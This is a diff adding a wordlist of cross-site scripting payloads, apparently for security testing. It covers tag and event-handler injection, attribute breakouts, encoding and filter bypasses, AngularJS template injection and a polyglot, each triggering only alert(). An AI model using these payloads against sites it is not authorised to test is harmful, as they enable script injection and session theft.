@@ -1,0 +1,79 @@
+# Basic XSS Payloads
+<script>alert(1)</script>
+<script>alert('XSS')</script>
+<script>alert(document.domain)</script>
+<img src=x onerror=alert(1)>
+<img src=x onerror=alert('XSS')>
+<svg onload=alert(1)>
+<svg/onload=alert(1)>
+<body onload=alert(1)>
+<iframe src="javascript:alert(1)">
+<input onfocus=alert(1) autofocus>
+<select onfocus=alert(1) autofocus>
+<textarea onfocus=alert(1) autofocus>
+<keygen onfocus=alert(1) autofocus>
+<video><source onerror="alert(1)">
+<audio src=x onerror=alert(1)>
+<details open ontoggle=alert(1)>
+<marquee onstart=alert(1)>
+
+# Attribute Injection
+" onmouseover="alert(1)
+' onmouseover='alert(1)
+"><script>alert(1)</script>
+'><script>alert(1)</script>
+"><img src=x onerror=alert(1)>
+"><svg onload=alert(1)>
+
+# JavaScript Protocol
+javascript:alert(1)
+javascript:alert('XSS')
+&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;
+
+# HTML Entities / Encoding
+&lt;script&gt;alert(1)&lt;/script&gt;
+<scr<script>ipt>alert(1)</scr</script>ipt>
+<ScRiPt>alert(1)</sCrIpT>
+<SCRIPT>alert(1)</SCRIPT>
+
+# Event Handlers
+<div onmouseover="alert(1)">hover</div>
+<a href="javascript:alert(1)">click</a>
+<button onclick="alert(1)">click</button>
+<form><button formaction="javascript:alert(1)">X</button></form>
+
+# Filter Bypass
+<img src="x" onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;">
+<img src=x onerror=\u0061lert(1)>
+<svg><script>alert(1)</script></svg>
+<math><mtext></table><img src=x onerror=alert(1)>
+<<script>alert(1)//<</script>
+<script>eval(atob('YWxlcnQoMSk='))</script>
+
+# DOM-based
+#<script>alert(1)</script>
+#"><img src=x onerror=alert(1)>
+
+# Template / AngularJS
+{{constructor.constructor('alert(1)')()}}
+{{7*7}}
+${alert(1)}
+#{alert(1)}
+
+# URL Encoded
+%3Cscript%3Ealert(1)%3C/script%3E
+%22%3E%3Cscript%3Ealert(1)%3C/script%3E
+
+# Double Encoding
+%253Cscript%253Ealert(1)%253C/script%253E
+
+# Null Byte
+<scr%00ipt>alert(1)</scr%00ipt>
+<s%00c%00r%00i%00p%00t>alert(1)</s%00c%00r%00i%00p%00t>
+
+# CSS Injection
+<style>*{background:url(javascript:alert(1))}</style>
+<div style="background:url(javascript:alert(1))">
+
+# Polyglot
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
